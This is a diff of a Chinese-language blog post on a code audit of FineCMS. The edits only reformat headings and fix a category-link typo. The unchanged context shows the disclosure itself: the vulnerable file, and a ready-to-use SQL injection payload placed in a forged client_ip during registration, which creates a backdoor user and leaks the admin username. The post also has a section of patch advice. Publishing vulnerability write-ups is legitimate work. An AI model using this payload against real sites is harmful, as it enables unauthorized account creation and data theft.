@@ -92,11 +92,11 @@
   </header>
 
 
-<div class="entry-content"><h1>简介:</h1>
+<div class="entry-content"><blockquote><h1>简介:</h1></blockquote>
 
 <h2>FineCMS是一款基于PHP+MySql开发的内容管理系统,采用MVC设计模式，实现业务逻辑与表现层的适当分离，使网页设计师能够轻松设计出理想的模板。</h2>
 
-<h1>漏洞文件:</h1>
+<blockquote><h1>漏洞文件:</h1></blockquote>
 
 <h2>Client.Class.php 29行处:</h2>
 
@@ -164,14 +164,14 @@
 </pre>
 
 
-<h1>漏洞利用:</h1>
+<blockquote><h1>漏洞利用:</h1></blockquote>
 
 <h2>EXP:提交用户注册的时候,伪造一个client_ip,内容如下:</h2>
 
 <p>sb&#8217;,&#8217;1&#8217;,&#8217;6&#8217;),(&#8216;hell&#8217;,&#8217;1b192f49ddec03d0c7e777d3e578cebf&#8217;,(select username from fn_user where userid=1),&#8217;1&#8217;,&#8217;11111&#8217;,&#8217;sbd&#8217;,&#8217;1&#8217;,&#8217;6&#8217;)#
 成功之后,登陆用户:hell,密码:sbdan. 邮箱处就有管理员的user了.</p>
 
-<h1>修补建议:</h1>
+<blockquote><h1>修补建议:</h1></blockquote>
 
 <pre>
 <code>
@@ -221,7 +221,7 @@ function get_user_ip(){
 
 <span class="categories">
   
-    <a class='category' href='/blog/categories/code-nbspaudit/'>Code&&nbspAudit</a>
+    <a class='category' href='/blog/categories/code-nbspaudit/'>Code&nbspAudit</a>
   
 </span>
 
@@ -259,7 +259,7 @@ function get_user_ip(){
     
 <section>
 <h1>Categories</h1>
-<span class='categories_tag'> <a href='/blog/categories/code-nbspaudit' style='font-size: 160.0%'>Code&&nbspaudit(1)</a>  <a href='/blog/categories/php-nbspdevelopment' style='font-size: 160.0%'>Php&nbspdevelopment(1)</a>  <a href='/blog/categories/vida' style='font-size: 160.0%'>Vida(1)</a> </span>
+<span class='categories_tag'> <a href='/blog/categories/code-nbspaudit' style='font-size: 160.0%'>Code&nbspaudit(1)</a>  <a href='/blog/categories/php-nbspdevelopment' style='font-size: 160.0%'>Php&nbspdevelopment(1)</a>  <a href='/blog/categories/vida' style='font-size: 160.0%'>Vida(1)</a> </span>
 </section>
 
 <section>
